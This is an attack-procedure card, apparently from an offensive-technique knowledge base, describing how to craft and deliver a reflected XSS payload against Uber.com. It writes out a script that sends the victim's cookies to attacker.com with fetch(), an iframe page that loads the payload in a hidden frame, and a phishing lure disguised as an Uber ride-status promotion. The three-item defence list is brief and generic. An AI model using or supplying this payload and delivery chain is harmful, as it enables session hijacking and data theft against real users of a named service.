---
id: proc-craft-uber-xss-payload
name: Craft and Deliver XSS Payload for Uber.com
tags:
  - xss
  - payload-crafting
  - phishing
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.493Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Deliver XSS Payload for Uber.com

## Summary

This procedure details creating a malicious JavaScript payload tailored to the Uber reflected XSS and delivering it via a controlled website to trick victims into execution.

## Description

Once the vulnerable endpoint is identified, craft a payload that injects via URL reflection. Host it on an attacker-controlled site that links or redirects to Uber with the payload encoded. This executes JS in Uber's context, allowing access to victim data. The bypass method, as reported, enables cross-site interactions like token theft.

## Requirements

1. Local web server to host malicious HTML
2. URL encoding knowledge for evasion
3. Phishing vector (e.g., email with link)

## Defense

Defensive measures and detection strategies:

- URL validation and parameter whitelisting
- Rate limiting on suspicious redirects
- User education on phishing links

## Objectives

1. Create executable payload
2. Host and deliver via malicious site
3. Ensure execution in victim browser

## Instructions

### Step 1: Encode the Payload

**Context**: Prepare JS to exfiltrate data, encoding to fit URL and evade filters.

Write a payload like <script>fetch('https://attacker.com/log?data='+encodeURIComponent(document.cookie))</script> and URL-encode it (e.g., %3Cscript%3E...).

> This sends cookies to attacker's server upon execution.

### Step 2: Host Malicious Page

**Context**: Create an HTML page that loads the vulnerable Uber URL with payload.

Save an HTML file with <iframe src="https://www.uber.com?vulnparam=[encoded_payload]"></iframe> and serve it locally using python -m http.server 8000.

> Victim visiting http://attacker.com triggers the iframe load and payload execution.

### Step 3: Deliver to Victim

**Context**: Use social engineering to get the victim to visit the page while authenticated on Uber.

Send a phishing link disguised as an Uber promotion, e.g., "Check your ride status: [malicious URL]".

> Execution occurs silently in the background iframe.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-crafting]]
